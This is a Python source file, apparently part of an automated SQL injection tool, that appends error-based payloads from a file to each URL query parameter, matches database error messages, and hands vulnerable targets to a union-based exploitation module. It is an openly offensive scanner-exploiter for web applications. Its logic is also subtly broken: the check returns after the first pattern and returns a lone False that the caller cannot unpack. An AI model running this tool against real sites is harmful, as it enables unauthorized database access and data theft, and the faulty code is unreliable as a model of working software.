import requests
from urllib.parse import urlparse
import re
import Union_based_attack

with open('Error-regexs\MySQL_Error.txt', 'r') as Mysql_Errors:
    Mysql_Error = Mysql_Errors.readlines()
with open('Error-regexs\Oracle_Error.txt', 'r') as Oracle_Errors:
    Oracle_Error = Oracle_Errors.readlines()
with open('Error-regexs\PostgreSQL_Error.txt', 'r') as PostgreSQL_Errors:
    PostgreSQL_Error = PostgreSQL_Errors.readlines()
with open('Error-regexs\MsSQL_Error.txt', 'r') as MS_Errors:
    MS_Error = MS_Errors.readlines()

DB_errors = [Mysql_Error, Oracle_Error, PostgreSQL_Error, MS_Error]


def exploit_sqli(url, payload, param):
    param += payload
    injection_url = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path + "?" + param
    response = requests.get(injection_url)
    for i in range(len(DB_errors)):
        for massage in DB_errors[i]:
            massage = massage.strip()
            pattern = re.compile(massage)
            if pattern.search(response.text):
                return True, massage
            else:
                return False


def sample_Get_inj(url):
    url = url
    params = urlparse(url).query.split("&")
    print("[*] Test Error based injection")
    for param in params:
        print("[*] Test Parameter: {}".format(param))
        with open('Error-regexs\Error-based-payloads.txt', 'r') as payload_list:
            for payload in payload_list:
                payload = payload.strip()
                injected, massage = exploit_sqli(url, payload, param)
                if injected:
                    print("[+] SQL injection is Founded, using payload: {} ".format(payload))
                    Union_based_attack.UnionExploitation(url, massage)
                    break
